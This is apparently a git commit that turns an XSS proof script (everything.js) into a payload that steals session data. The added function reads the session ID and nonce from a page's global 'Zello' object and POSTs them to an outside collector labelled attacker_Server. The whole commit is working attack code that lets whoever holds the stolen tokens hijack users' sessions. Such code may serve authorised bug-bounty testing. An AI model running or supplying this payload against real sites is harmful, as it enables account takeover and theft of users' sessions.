0749c7da956269f8e0c10dfb479bd4886c72b028
ambush <iamherovirat@gmail.com>
2025-11-06 11:16:10 +0545

    IIFE for SID exfiltration

--- everything.js
+++ everything.js
@@ -1,2 +1,26 @@
-alert(`XSS by AMBUSH on ${document.domain}`);
-console.log('XSSed');
+//SID exfiltration
+
+(async function(){
+    try{
+        if(typeof Zello==='undefined'){
+            console.log('Zello Object Not Found! Be authenticated');
+            return;
+        }
+        const sid= Zello.sid || Zello['sid'];
+        const nonce= Zello.nonce || Zello['nonce'];
+		console.log(sid,nonce)
+
+        const attacker_Server='https://ywhftw.free.beeceptor.com'
+        await fetch(attacker_Server,{
+            method:'POST',           
+            body:new URLSearchParams({
+                sid:sid,
+                nonce:nonce
+            })
+        })
+
+    }
+    catch(e){
+        console.log("Error due to",e)
+    }
+})()
